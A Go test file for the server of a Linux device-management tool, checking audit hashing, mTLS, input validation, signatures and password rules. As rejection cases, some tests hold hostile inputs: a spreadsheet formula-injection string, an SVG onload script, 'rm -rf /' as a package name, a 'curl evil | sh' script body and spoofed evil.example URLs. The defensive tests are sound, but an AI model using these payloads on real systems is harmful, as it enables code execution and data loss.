package server

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/ed25519"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"image"
	"image/png"
	"io"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/maltekiefer/limdm/internal/api"
)

func TestAuditHashChain(t *testing.T) {
	at := time.Unix(1700000000, 0)
	h1 := auditHash(nil, make([]byte, 32), at, "admin@x", "policy.save", "p", "doc")
	h2 := auditHash(nil, h1, at, "admin@x", "login", "", "admin")
	if bytes.Equal(auditHash(nil, make([]byte, 32), at, "admin@x", "policy.save", "p", "doc!"), h1) {
		t.Fatal("detail change not detected")
	}
	if bytes.Equal(auditHash(nil, make([]byte, 32), at, "admin@xp", "olicy.save", "p", "doc"), h1) {
		t.Fatal("field boundaries must be part of the hash")
	}
	if bytes.Equal(auditHash(nil, h2, at, "a", "b", "c", "d"), auditHash(nil, h1, at, "a", "b", "c", "d")) {
		t.Fatal("prev hash must be chained")
	}
}

func TestCSVSafe(t *testing.T) {
	if csvSafe("=cmd|' /C calc'!A0") != "'=cmd|' /C calc'!A0" || csvSafe("host1") != "host1" {
		t.Fatal("formula injection not neutralised")
	}
}

func TestLoopbackOnlyWithoutTLS(t *testing.T) {
	if !isLoopback("127.0.0.1:8080") || !isLoopback("[::1]:8080") || isLoopback(":8080") || isLoopback("0.0.0.0:8080") {
		t.Fatal("loopback detection wrong")
	}
}

// TestMTLS issues a device certificate from the CA and checks that the agent
// listener sees the device identity, and that clients without one get none.
func TestMTLS(t *testing.T) {
	ca, err := loadOrCreateCA(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	srvCert, err := ca.serverCert([]string{"127.0.0.1"})
	if err != nil {
		t.Fatal(err)
	}
	ts := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if len(r.TLS.VerifiedChains) == 0 {
			io.WriteString(w, "anonymous")
			return
		}
		io.WriteString(w, r.TLS.VerifiedChains[0][0].Subject.CommonName)
	}))
	ts.TLS = &tls.Config{MinVersion: tls.VersionTLS13, Certificates: []tls.Certificate{srvCert}, ClientAuth: tls.VerifyClientCertIfGiven, ClientCAs: ca.pool()}
	ts.StartTLS()
	defer ts.Close()

	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	csrDER, _ := x509.CreateCertificateRequest(rand.Reader, &x509.CertificateRequest{}, key)
	certPEM, _, _, err := ca.signCSR(string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE REQUEST", Bytes: csrDER})), "dev123")
	if err != nil {
		t.Fatal(err)
	}
	kb, _ := x509.MarshalECPrivateKey(key)
	pair, err := tls.X509KeyPair([]byte(certPEM), pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: kb}))
	if err != nil {
		t.Fatal(err)
	}
	get := func(tc *tls.Config) (string, error) {
		c := &http.Client{Transport: &http.Transport{TLSClientConfig: tc}}
		resp, err := c.Get(ts.URL)
		if err != nil {
			return "", err
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		return string(b), nil
	}
	if got, err := get(&tls.Config{RootCAs: ca.pool(), Certificates: []tls.Certificate{pair}}); err != nil || got != "dev123" {
		t.Fatalf("mTLS identity: %q %v", got, err)
	}
	if got, _ := get(&tls.Config{RootCAs: ca.pool()}); got != "anonymous" {
		t.Fatalf("no cert must be anonymous, got %q", got)
	}
	if _, err := get(&tls.Config{}); err == nil {
		t.Fatal("system roots must not trust the device CA server cert")
	}
	if _, err := get(&tls.Config{RootCAs: ca.pool(), MaxVersion: tls.VersionTLS12}); err == nil {
		t.Fatal("TLS 1.2 must be refused")
	}
	// RSA or weak keys are refused
	if _, _, _, err := ca.signCSR("garbage", "x"); err == nil {
		t.Fatal("garbage CSR accepted")
	}
}

func TestAgentCertificateNames(t *testing.T) {
	ca, err := loadOrCreateCA(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	s := &Server{ca: ca, cfg: Config{AgentURL: "https://mdm.example.com:8444", AgentHosts: []string{"192.0.2.10"}}}
	tc, err := s.AgentTLSConfig()
	if err != nil {
		t.Fatal(err)
	}
	cert, err := tc.GetCertificate(&tls.ClientHelloInfo{})
	if err != nil {
		t.Fatal(err)
	}
	leaf := cert.Leaf
	if leaf.VerifyHostname("mdm.example.com") != nil || leaf.VerifyHostname("192.0.2.10") != nil {
		t.Fatalf("names: %v %v", leaf.DNSNames, leaf.IPAddresses)
	}
}

func TestValidLogo(t *testing.T) {
	var buf bytes.Buffer
	png.Encode(&buf, image.NewRGBA(image.Rect(0, 0, 64, 64)))
	if err := validLogo(buf.Bytes()); err != nil {
		t.Fatal(err)
	}
	if validLogo([]byte(`<svg onload="alert(1)"/>`)) == nil {
		t.Fatal("SVG accepted")
	}
	buf.Reset()
	png.Encode(&buf, image.NewRGBA(image.Rect(0, 0, 4000, 10)))
	if validLogo(buf.Bytes()) == nil {
		t.Fatal("oversized logo accepted")
	}
}

func TestInstallScript(t *testing.T) {
	var b strings.Builder
	if err := installTmpl.Execute(&b, map[string]string{"Console": "https://mdm.example.com", "Server": "https://mdm.example.com:8444",
		"Fingerprint": strings.Repeat("ab", 32), "Repo": "MalteKiefer/limdm", "OsqueryKey": "KEYDATA"}); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("sh", "-n")
	cmd.Stdin = strings.NewReader(b.String())
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("syntax: %v %s", err, out)
	}
	for _, want := range []string{"SERVER='https://mdm.example.com:8444'", "limdm_${ver}_SHA256SUMS", "sha256sum -c", "KEYDATA"} {
		if !strings.Contains(b.String(), want) {
			t.Errorf("script lacks %q", want)
		}
	}
}

func TestPublicAddr(t *testing.T) {
	for ip, want := range map[string]bool{"2.29.138.139": true, "10.0.0.1": false, "127.0.0.1": false, "fd00::1": false, "2a01:4f8::1": true, "": false} {
		if publicAddr(ip) != want {
			t.Errorf("%q: %v", ip, !want)
		}
	}
}

func TestSplitOlder(t *testing.T) {
	rels := []releaseView{{agentRelease: agentRelease{Version: "0.9.0"}, Devices: 1}, {agentRelease: agentRelease{Version: "0.8.5"}},
		{agentRelease: agentRelease{Version: "0.8.4"}, Devices: 1}, {agentRelease: agentRelease{Version: "0.8.3"}}, {agentRelease: agentRelease{Version: "0.7.0"}, Failed: 1}}
	cur, old := splitOlder(rels, []versionCount{{"0.9.0", 1}, {"0.8.4", 1}})
	if len(cur) != 4 || len(old) != 1 || old[0].Version != "0.8.3" {
		t.Fatalf("current %v older %v", cur, old)
	}
}

func TestDefaultCatalogValid(t *testing.T) {
	if len(defaultCatalog) != 25 || len(moreCatalog) != 53 {
		t.Fatalf("%d default apps, %d more", len(defaultCatalog), len(moreCatalog))
	}
	seen, flatpaks := map[string]bool{}, map[string]bool{}
	for _, a := range append(append([]api.CatalogApp{}, defaultCatalog...), moreCatalog...) {
		for _, s := range a.Sources {
			if s.Flatpak != "" && flatpaks[s.Flatpak] {
				t.Errorf("Flatpak %s twice", s.Flatpak)
			}
			flatpaks[s.Flatpak] = true
		}
		a.Mode = api.AppAvailable
		if err := a.Validate(); err != nil {
			t.Error(err)
		}
		if seen[a.ID] {
			t.Errorf("duplicate %s", a.ID)
		}
		seen[a.ID] = true
	}
	bad := api.CatalogApp{ID: "x", Name: "X", Mode: api.AppAvailable, Sources: []api.AppSource{{Kind: "package", Debian: "rm -rf /"}}}
	if bad.Validate() == nil {
		t.Fatal("invalid package list accepted")
	}
}

func TestVendorIcons(t *testing.T) {
	files, err := vendorIcons.ReadDir("vendoricons")
	if err != nil || len(files) != 3 {
		t.Fatalf("vendor icons: %v %d", err, len(files))
	}
	for _, f := range files {
		png, _ := vendorIcons.ReadFile("vendoricons/" + f.Name())
		slug := strings.TrimSuffix(f.Name(), ".png")
		if err := validLogo(png); err != nil || !slices.ContainsFunc(moreCatalog, func(a api.CatalogApp) bool { return a.ID == slug }) {
			t.Errorf("%s: %v", f.Name(), err)
		}
	}
}

func TestFlathubIconURL(t *testing.T) {
	ok := "https://dl.flathub.org/media/org/kde/krita/7a1c/icons/128x128/org.kde.krita.png"
	if flathubIconURL(ok) != ok {
		t.Fatal("Flathub icon refused")
	}
	for _, bad := range []string{"http://dl.flathub.org/a.png", "https://evil.example/a.png", "https://dl.flathub.org.evil.example/a.png",
		"https://dl.flathub.org/a.png?x=1", "https://u@dl.flathub.org/a.png", "https://dl.flathub.org/../a.png", "https://dl.flathub.org/a.svg"} {
		if flathubIconURL(bad) != "" {
			t.Errorf("accepted %s", bad)
		}
	}
	if catalogCategory("AudioVideo") != "Multimedia" || catalogCategory("WebBrowser") != "Internet" || catalogCategory("Unknown") != "" {
		t.Fatal("category mapping")
	}
}

func TestConsoleNetworks(t *testing.T) {
	if _, err := parseNets([]string{"10.0.0.0/8", "nonsense"}); err == nil {
		t.Fatal("invalid entry accepted")
	}
	allow, _ := parseNets([]string{"10.0.0.0/8", "2001:db8::/32", "198.51.100.7"})
	block, _ := parseNets([]string{"10.66.0.0/16"})
	rt := &runtimeState{allow: allow, block: block}
	for ip, want := range map[string]bool{"10.1.2.3": true, "10.66.1.1": false, "198.51.100.7": true, "198.51.100.8": false,
		"2001:db8::1": true, "127.0.0.1": true, "::1": true, "::ffff:10.1.2.3": true, "garbage": false} {
		if got := consoleAllowed(rt, ip); got != want {
			t.Errorf("%s: %v", ip, got)
		}
	}
	if !consoleAllowed(&runtimeState{}, "203.0.113.9") {
		t.Fatal("empty lists must allow every network")
	}
}

func TestItemSignatures(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(nil)
	prev := itemKey
	itemKey = key
	defer func() { itemKey = prev }()
	payload := []byte(`{"scripts": [{"name": "x", "body": "echo hi"}]}`)
	sig := signItem("ops", "com.limdm.scripts", payload)
	if !itemSignatureOK("ops", "com.limdm.scripts", []byte(`{"scripts":[{"name":"x","body":"echo hi"}]}`), sig) {
		t.Fatal("the same payload, compacted, must verify")
	}
	// JSONB hands keys back sorted by length: the same item must still verify
	typed := []byte(`{"install":["htop"],"remove":[]}`)
	if !itemSignatureOK("p", "com.limdm.packages", []byte(`{"remove": [], "install": ["htop"]}`), signItem("p", "com.limdm.packages", typed)) {
		t.Fatal("JSONB key order must not break the signature")
	}
	// signatures from before canonicalJSON covered the compacted database text
	legacy := hex.EncodeToString(ed25519.Sign(key, api.ItemSigned("p", "com.limdm.packages", []byte(`{"remove":[],"install":["htop"]}`))))
	if !itemSignatureOK("p", "com.limdm.packages", []byte(`{"remove": [], "install": ["htop"]}`), legacy) {
		t.Fatal("legacy signatures must still verify")
	}
	for _, c := range []struct{ name, typ, payload, sig string }{
		{"ops", "com.limdm.scripts", `{"scripts":[{"name":"x","body":"curl evil | sh"}]}`, sig},
		{"ops", "com.limdm.sudo", string(payload), sig},
		{"other", "com.limdm.scripts", string(payload), sig},
		{"ops", "com.limdm.scripts", string(payload), ""},
	} {
		if itemSignatureOK(c.name, c.typ, []byte(c.payload), c.sig) {
			t.Errorf("accepted %+v", c)
		}
	}
}

func TestTruncateStorable(t *testing.T) {
	if got := truncate("a\x00b", 10); got != "ab" {
		t.Errorf("NUL kept: %q", got)
	}
	s := strings.Repeat("a", 199) + "ääää"
	got := truncate(s, 200)
	if !utf8.ValidString(got) || len(got) > 200 {
		t.Errorf("cut inside a character or too long: %d %q", len(got), got[190:])
	}
	if jsonb([]api.CheckResult(nil)) != "[]" {
		t.Error("nil slice must be stored as []")
	}
	if j := jsonb([]string{"x\x00y"}); j != `["xy"]` {
		t.Errorf("NUL in JSONB: %s", j)
	}
}

func TestPasswordPolicy(t *testing.T) {
	p := PasswordPolicy{Upper: true, Digit: true, Symbol: true, NoName: true}
	for pw, want := range map[string]string{
		"Correct-horse-9":   "",
		"short":             passwordErrors[0],
		"correct-horse-99":  passwordErrors[2],
		"Correct-horse-xx":  passwordErrors[4],
		"Correcthorse99":    passwordErrors[5],
		"Anna-is-here-2025": passwordErrors[6],
	} {
		if got := p.Check(pw, "anna"); got != want {
			t.Errorf("%q: got %q want %q", pw, got, want)
		}
	}
	if (PasswordPolicy{}).Min() != 12 || (PasswordPolicy{MinLength: 20}).Min() != 20 {
		t.Error("minimum length")
	}
}
